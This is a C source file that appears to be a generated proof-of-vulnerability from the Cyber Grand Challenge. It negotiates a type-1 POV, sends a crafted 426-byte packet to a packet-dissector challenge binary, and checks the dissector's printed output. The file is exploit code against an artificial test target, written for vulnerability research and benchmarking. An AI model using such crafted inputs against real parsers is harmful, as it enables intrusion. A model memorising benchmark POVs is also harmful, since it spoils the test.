#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xaa\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x92\x01\x00\x00\x8a\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x8a\x01\x00\x00"
         "\x43\xdb\x14\xa0\x29\x18\x11\xc5\x55\xe3\x3f\x47\x83\xe5\xd9\xad"
         "\x36\x54\xdf\x02\x0d\x00\x00\x00\x41\x00\x01\xa6\x2d\x47\x97\x46"
         "\x19\x5e\xe1\xfc\x2c\xef\xaa\x27\x6f\x15\x47\x80\x01\x00\x41\x00"
         "\xd0\xc0\x39\x01\xc5\x15\xbe\xaa\xa1\x4a\x73\xa6\x74\xff\x1e\x54"
         "\xa8\x00\x8c\x2e\x6a\x4e\x7d\x6a\xe0\x1a\x5f\xb1\x34\x53\xed\xff"
         "\x0f\xdf\xcf\xa0\x02\xaa\x1c\x97\xe5\xbd\xb0\x23\x2f\x5d\xbc\x88"
         "\x91\xb4\xe9\x23\x72\x81\x95\x88\xab\x52\xc4\x39\x12\x9a\x7e\x22"
         "\xb8\x3d\xc9\x88\x38\x35\xc6\x5a\x4f\x4c\x71\x09\xde\xf8\x27\x95"
         "\x16\x6a\xc5\x93\xbf\xdf\xa5\xc2\xd1\x90\x36\xc3\xc9\x48\xb8\x8a"
         "\x00\x94\x08\x36\x1a\x80\xc6\xd2\xd6\xed\xcb\x31\x6b\xc8\x2b\x92"
         "\xf1\xd8\x35\xd5\x7f\x22\xde\x59\x41\x0f\x34\x53\xac\x36\x09\xd8"
         "\x75\xfd\xa4\x47\x29\xab\x84\xce\x96\xfd\xe3\x32\xf5\x86\x79\x1f"
         "\x18\xf7\xcd\x74\x53\xc5\x48\x4e\x98\x46\x38\x7c\x63\x83\x54\x6d"
         "\xea\x98\x10\x36\x53\x19\x51\xde\xef\x10\x53\x69\x7e\x39\x36\xeb"
         "\x8c\xec\xfc\xcb\xec\x98\x7f\xc6\x4c\x3b\xe9\x76\xee\xe2\x47\x9d"
         "\xb8\x79\x86\xa0\x32\x24\xbf\xb8\x94\x5f\x46\xfd\x67\xf9\x84\x5b"
         "\xbc\x44\x32\x3c\x85\xb5\x24\x72\x1a\xa4\x8f\xcf\x62\x7c\x09\x50"
         "\x67\xa6\x30\xe2\xc6\x45\x45\x74\xe5\x55\x35\x24\x27\x90\xc9\xd6"
         "\x75\xed\x55\xb1\x78\x0f\x9f\xdb\xbb\x4d\x6a\x17\x39\x95\xfd\x6b"
         "\xe4\xbd\xc7\x1d\x94\x3b\xe4\x5e\x52\xc2\x7f\x22\x4a\x01\xc3\x01"
         "\x14\x01\x00\x56\x91\x86\x26\x5a\x21\x0c\xc9\x35\x99\xf3\x33\x65"
         "\xf8\x17\x41\x5d\xfa\x4a\x23\x44\x33\x16\xcb\xe1\x53\xbc\xf7\x83"
         "\x73\xe1\xe7\xda\x41\x00\x10\x66\x0c\x7c\xa4\xb0\x00\xce\x2a\x36"
         "\x56\xc9\x78\x84\xa1\x49\x53\xbc\xad\x4d\x4d\x19\x3d\x34\x08\x0d"
         "\xfe\x54\x22\x01\x00\xa2\x66\x0d\x0d\x99";
      static unsigned int write_00001_00000_len = 426;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamatelodendron
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x74\x65\x6c\x6f\x64\x65"
         "\x6e\x64\x72\x6f\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
